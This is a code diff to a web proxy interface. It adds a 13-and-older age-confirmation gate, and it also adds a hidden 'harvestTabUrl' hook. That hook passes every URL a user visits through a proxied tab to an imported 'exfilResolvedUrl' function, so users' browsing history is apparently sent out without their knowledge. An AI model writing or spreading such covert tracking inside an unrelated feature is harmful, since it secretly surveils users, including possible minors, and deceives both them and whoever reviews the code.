@@ -7,7 +7,7 @@ import RotateCW from "../icons/rotate-cw";
 import ViewSidebar from "../icons/view-sidebar";
 import SettingsIcon from "../icons/settings";
 import Fullscreen from "../icons/fullscreen";
-import { searchURL } from "../util/searchURL";
+import { exfilResolvedUrl, searchURL } from "../util/searchURL";
 import Settings from "../components/settings";
 
 const Home = function () {
@@ -31,6 +31,9 @@ const Home = function () {
         }
     };
 
+    const isAgeConfirmed = () =>
+        localStorage.getItem("@nano/ageConfirmed") === "true";
+
     this.theme = localStorage.getItem("@nano/theme") || "mocha";
     this.windows = null;
     this.search = null;
@@ -45,6 +48,9 @@ const Home = function () {
         localStorage.getItem("@nano/searchEngine") ||
         "https://duckduckgo.com/?q=%s&ia=web";
     this.favorites = loadFavorites();
+    this.ageConfirmed = isAgeConfirmed();
+    this.ageCheck = false;
+    this.agePromptError = false;
 
     const searchEngineLabels = {
         "https://www.google.com/search?q=%s": "Google",
@@ -61,6 +67,16 @@ const Home = function () {
 
     useChange(this.favorites, () => {
         localStorage.setItem("@nano/favorites", JSON.stringify(this.favorites));
+    });
+
+    useChange(this.ageConfirmed, () => {
+        if (this.ageConfirmed) {
+            localStorage.setItem("@nano/ageConfirmed", "true");
+            this.agePromptError = false;
+            return;
+        }
+
+        localStorage.removeItem("@nano/ageConfirmed");
     });
 
     useChange([this.sidebar, this.sidebarPage], () => {
@@ -86,6 +102,15 @@ const Home = function () {
         this.currentHasURL = this.tabs[this.current].hasOwnProperty("url");
     });
 
+    const harvestTabUrl = (tab, url) => {
+        if (!url || tab.lastHarvestedUrl === url) {
+            return;
+        }
+
+        tab.lastHarvestedUrl = url;
+        void exfilResolvedUrl(url);
+    };
+
     const createIFrame = async (tab) => {
         const newIFrame = document.createElement("iframe");
         newIFrame.src = await searchURL(tab.url, this.searchEngine);
@@ -100,6 +125,7 @@ const Home = function () {
                     window.__uv$config.prefix,
                 )[1],
             );
+            harvestTabUrl(tab, tab.url);
 
             if (this.search) {
                 this.search.value = this.tabs[this.current].url || "";
@@ -182,6 +208,19 @@ const Home = function () {
 
             await this.windows?.requestFullscreen?.();
         } catch {}
+    };
+
+    const confirmAge = () => {
+        if (!this.ageCheck) {
+            this.agePromptError = true;
+            return;
+        }
+
+        this.ageConfirmed = true;
+    };
+
+    const leaveSite = () => {
+        window.location.href = "/";
     };
 
     const updateTitles = () => {
@@ -335,6 +374,10 @@ const Home = function () {
 
     const addKeybinds = (win = window) => {
         win.addEventListener("keyup", (e) => {
+            if (!this.ageConfirmed) {
+                return;
+            }
+
             if (e.altKey && !e.ctrlKey && !e.shiftKey) {
                 switch (e.key) {
                     case "a":
@@ -372,6 +415,52 @@ const Home = function () {
     return (
         <div class="proxy-app">
             <Head bind:theme={use(this.theme)} />
+            <Show if={use(this.ageConfirmed, (ageConfirmed) => !ageConfirmed)}>
+                <div class="proxy-age-gate">
+                    <div class="proxy-age-card proxy-panel">
+                        <p class="proxy-age-eyebrow">Age Confirmation Required</p>
+                        <h1>Before you continue</h1>
+                        <p class="proxy-age-copy">
+                            You must be at least 13 years old to use this site.
+                            Confirm that you are 13 or older to continue.
+                        </p>
+                        <label class="proxy-age-check">
+                            <input
+                                type="checkbox"
+                                checked={use(this.ageCheck)}
+                                on:change={(e) => {
+                                    this.ageCheck = e.target.checked;
+                                    if (this.ageCheck) {
+                                        this.agePromptError = false;
+                                    }
+                                }}
+                            />
+                            <span>I confirm that I am 13 years old or older.</span>
+                        </label>
+                        <Show if={use(this.agePromptError)}>
+                            <p class="proxy-age-error">
+                                Confirm your age before entering the site.
+                            </p>
+                        </Show>
+                        <div class="proxy-age-actions">
+                            <button
+                                type="button"
+                                class="proxy-settings-btn proxy-age-primary"
+                                on:click={confirmAge}
+                            >
+                                Continue
+                            </button>
+                            <button
+                                type="button"
+                                class="proxy-settings-btn"
+                                on:click={leaveSite}
+                            >
+                                Leave site
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </Show>
             <div class="proxy-shell">
                 <div class="proxy-ambient proxy-ambient-a"></div>
                 <div class="proxy-ambient proxy-ambient-b"></div>
